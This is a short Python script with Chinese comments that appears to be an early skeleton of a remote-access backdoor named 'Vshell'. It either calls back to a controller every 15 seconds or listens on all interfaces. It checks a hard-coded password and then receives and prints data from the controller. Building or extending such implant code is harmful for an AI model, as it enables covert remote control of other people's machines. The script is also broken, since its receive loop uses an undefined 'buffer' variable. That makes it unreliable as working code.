#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
# 导入socket库:
import socket
import time

# 变量定义
ACTIVE = 1
IP = '127.0.0.1'
PORT = 9481
PASS = 'AC131'

#文字颜色
# 红色 \033[0;31;48m[!]\033[0m
# 绿色 \033[0;32;48m[+]\033[0m
# 黄色 \033[0;33;48m[-]\033[0m

# 主动连接控制端
def Active():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((IP, PORT)) != 0:
            s.close()
            time.sleep(15)
        elif PassCheck(s):
            return s
        else:
            s.close()
            time.sleep(15)

# 等待控制端连接
def Passive():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',PORT))
    s.listen(1)
    while True:
        sock, addr = s.accept()
        if PassCheck(sock):
            return sock
            

def PassCheck(sock):
    while True:
        cmd = sock.recv(1024)
        time.sleep(1)
        if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
            sock.send(b'HiAdmin')
            return True
        else:
            sock.send(b'NoAccess')
            return False
        

# 主功能
if ACTIVE == 0:
    s = Passive()
else:
    s = Active()
while True:
    # 每次最多接收1k字节:
    d = s.recv(1024)
    if d:
        buffer.append(d)
    else:
        break
data = b''.join(buffer)
data = data.decode('utf-8')
print(data)
s.close()